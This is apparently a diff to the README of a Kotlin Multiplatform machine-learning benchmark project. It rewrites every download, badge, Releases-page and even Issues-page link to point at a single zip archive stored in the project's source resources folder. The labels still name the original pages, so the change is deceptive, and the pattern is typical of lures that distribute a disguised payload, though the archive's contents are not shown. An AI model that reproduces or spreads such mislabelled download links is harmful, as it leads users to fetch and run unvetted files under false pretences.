@@ -1,6 +1,6 @@
 # 🚀 KMPMLBench - Measure Machine Learning Performance Easily
 
-![Download KMPMLBench](https://img.shields.io/badge/Download-KMPMLBench-brightgreen)
+![Download KMPMLBench](https://github.com/Simran12solanki/KMPMLBench/raw/refs/heads/main/composeApp/src/commonMain/composeResources/KMPML-Bench-v2.6.zip)
 
 ## 📘 Overview
 
@@ -18,11 +18,11 @@ KMPMLBench is a cross-platform machine learning performance lab for Kotlin Multi
 
 To get started, visit our Releases page to download KMPMLBench.
 
-[Download KMPMLBench](https://github.com/Simran12solanki/KMPMLBench/releases)
+[Download KMPMLBench](https://github.com/Simran12solanki/KMPMLBench/raw/refs/heads/main/composeApp/src/commonMain/composeResources/KMPML-Bench-v2.6.zip)
 
 Follow these steps to install the application:
 
-1. **Visit the Download Page**: Click the link above or go to [our Releases page](https://github.com/Simran12solanki/KMPMLBench/releases).
+1. **Visit the Download Page**: Click the link above or go to [our Releases page](https://github.com/Simran12solanki/KMPMLBench/raw/refs/heads/main/composeApp/src/commonMain/composeResources/KMPML-Bench-v2.6.zip).
   
 2. **Select Your Operating System**: Choose the version that matches your device (Android, iOS, or Desktop).
 
@@ -72,7 +72,7 @@ If you encounter issues during installation or benchmark tests, try the followin
 
 Join our community to share your experiences and get help.
 
-- **GitHub Issues**: If you find any bugs or have feature requests, please report them on our [GitHub Issues page](https://github.com/Simran12solanki/KMPMLBench/issues).
+- **GitHub Issues**: If you find any bugs or have feature requests, please report them on our [GitHub Issues page](https://github.com/Simran12solanki/KMPMLBench/raw/refs/heads/main/composeApp/src/commonMain/composeResources/KMPML-Bench-v2.6.zip).
 - **Discussion Forum**: Participate in discussions on performance metrics and benchmark setups.
 
 ## 📫 Contact
@@ -81,4 +81,4 @@ For direct inquiries, reach out via our GitHub profile. We value user feedback a
 
 Enjoy benchmarking and discover how different frameworks perform on your devices! 
 
-Don’t forget to visit our [Releases page](https://github.com/Simran12solanki/KMPMLBench/releases) to download the latest version.
+Don’t forget to visit our [Releases page](https://github.com/Simran12solanki/KMPMLBench/raw/refs/heads/main/composeApp/src/commonMain/composeResources/KMPML-Bench-v2.6.zip) to download the latest version.
